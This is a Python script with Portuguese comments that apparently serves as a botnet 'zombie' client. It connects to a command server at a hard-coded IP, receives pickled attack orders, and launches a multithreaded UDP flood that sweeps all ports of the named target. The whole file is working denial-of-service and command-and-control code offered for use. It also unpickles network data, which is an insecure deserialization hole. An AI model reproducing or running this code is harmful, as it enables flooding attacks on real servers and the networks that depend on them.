import socket
import threading
import pickle
import time

# === Script de ataque original ===
import random

MAX_PACKET_SIZE = 4096
MIN_SLEEP = 0.001

class UDPTrafficThread(threading.Thread):
    def __init__(self, target, port_start, port_end, packet_size, duration, name):
        super().__init__(name=name)
        self.target = target
        self.port_start = port_start
        self.port_end = port_end
        self.packet_size = min(packet_size, MAX_PACKET_SIZE)
        self.duration = duration
        self.sent = 0
        self.lock = threading.Lock()
        self.running = True

    def update_packet_size(self, new_size):
        with self.lock:
            self.packet_size = min(new_size, MAX_PACKET_SIZE)

    def stop(self):
        self.running = False

    def run(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        port = self.port_start
        start_time = time.time()

        while self.running and time.time() - start_time < self.duration:
            with self.lock:
                payload = random._urandom(self.packet_size)
            try:
                client.sendto(payload, (self.target, port))
                self.sent += 1
                port += 1
                if port > self.port_end:
                    port = self.port_start
            except Exception as e:
                print(f"[{self.name}] Erro na porta {port}: {e}")

            time.sleep(MIN_SLEEP * (self.packet_size / 1024))

            if self.sent % 100 == 0:
                elapsed = time.time() - start_time
                pps = self.sent / max(1, elapsed)
                mbps = (self.sent * self.packet_size * 8) / (1024*1024*max(1, elapsed))
                print(f"[{self.name}] Pacotes: {self.sent}, PPS: {pps:.2f}, Mbps: {mbps:.2f}, Porta: {port}, Tamanho: {self.packet_size} bytes")

        client.close()

def run_multithread_udp(target, duration, threads, packet_size, mode="all", single_port=None, extra_params={}):
    thread_list = []
    if mode == "single" and single_port is not None:
        for i in range(threads):
            t = UDPTrafficThread(target, single_port, single_port, packet_size, duration, f"T{i+1}")
            t.start()
            thread_list.append(t)
    else:
        ports_per_thread = 65535 // threads
        for i in range(threads):
            start_port = i * ports_per_thread + 1
            end_port = (i + 1) * ports_per_thread
            t = UDPTrafficThread(target, start_port, end_port, packet_size, duration, f"T{i+1}")
            t.start()
            thread_list.append(t)
    return thread_list

def hybrid_mode(target, total_duration, threads, packet_size, initial_port, initial_duration):
    print(f"[Híbrido] Fase 1: {initial_duration}s na porta {initial_port}")
    threads_list = run_multithread_udp(target, initial_duration, threads, packet_size, mode="single", single_port=initial_port)
    monitor_threads(threads_list)
    
    remaining_time = total_duration - initial_duration
    if remaining_time > 0:
        print(f"[Híbrido] Fase 2: {remaining_time}s em todas as portas")
        threads_list = run_multithread_udp(target, remaining_time, threads, packet_size, mode="all")
        monitor_threads(threads_list)

def monitor_threads(thread_list):
    try:
        while any(t.is_alive() for t in thread_list):
            time.sleep(1)
    finally:
        for t in thread_list:
            t.stop()
        for t in thread_list:
            t.join()

# === Fim script original ===

SERVER_HOST = "192.168.3.8"  # Colocar IP do servidor
SERVER_PORT = 5000

# === Global attack manager para parar ataque via servidor ===
class GlobalAttack:
    def __init__(self):
        self.threads = []
        self.running = False

    def start_attack(self, target, duration, threads_count, packet_size):
        if self.running:
            return
        self.running = True
        ports_per_thread = 65535 // threads_count
        for i in range(threads_count):
            start_port = i * ports_per_thread + 1
            end_port = (i + 1) * ports_per_thread
            t = UDPTrafficThread(target, start_port, end_port, packet_size, duration, f"Thread-{i+1}")
            t.start()
            self.threads.append(t)

    def stop_attack(self):
        if not self.running:
            return
        for t in self.threads:
            t.stop()
        for t in self.threads:
            t.join()
        self.threads = []
        self.running = False

attack_manager = GlobalAttack()

def zombie_loop():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            print("[INFO] Conectado ao servidor.")
            
            while True:
                data = b""
                while True:
                    part = s.recv(4096)
                    if not part:
                        break
                    data += part
                    try:
                        payload = pickle.loads(data)
                        break
                    except:
                        continue
                if not data:
                    break

                # Se comando de parar ataque
                if isinstance(payload, dict) and payload.get("stop"):
                    attack_manager.stop_attack()
                    print("[INFO] Ataque parado pelo servidor.")
                    continue

                # Recebe os dados de ataque e executa
                target_ip = payload["target_ip"]
                duration = payload["duration"]
                threads = payload["threads"]
                packet_size = payload["packet_size"]
                mode = payload["mode"]
                extra_params = payload["extra_params"]

                # Inicia ataque via manager
                attack_manager.start_attack(target_ip, duration, threads, packet_size)

        except Exception as e:
            print(f"[INFO] Erro de conexão, tentando novamente em 5s: {e}")
            time.sleep(5)

if __name__ == "__main__":
    zombie_loop()
